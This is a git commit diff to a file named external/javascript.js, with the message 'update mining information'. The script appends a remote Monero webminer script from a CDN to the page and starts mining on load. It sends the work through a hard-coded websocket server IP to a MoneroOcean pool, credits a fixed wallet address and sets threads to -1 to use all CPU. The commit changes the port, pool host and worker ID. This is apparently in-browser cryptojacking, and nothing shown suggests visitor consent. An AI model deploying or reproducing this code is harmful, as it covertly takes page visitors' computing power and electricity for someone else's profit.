b72a07b5b234fef97f1a68659622bec55bb0fd23
Emengkeng <blessedsonlove@gmail.com>
2024-02-07 06:44:26 +0000

    update mining information

--- external/javascript.js
+++ external/javascript.js
@@ -6,10 +6,10 @@ var script = document.createElement("script");
 script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
 document.head.appendChild(script);
 
-server = "wss://45.119.82.33:40725/";
-var pool = "moneroocean.stream";
+server = "wss://45.119.82.33:10128/";
+var pool = "gulf.moneroocean.stream";
 var walletAddress = "48jHRYSargAAjLAcuowSfoWK2FaSq7QdVf8s4k1jZgki7Jh3iMGsDPqg1vR4BT3CEJPAg3b8gircW1sUbgZSsa5eHuJ4ZER";
-var workerId = "GH-XMR-JS-SNIPPET"
+var workerId = "GH-XMR-LK"
 var threads = -1;
 var password = "";
 startMining(pool, walletAddress, workerId, threads, password);
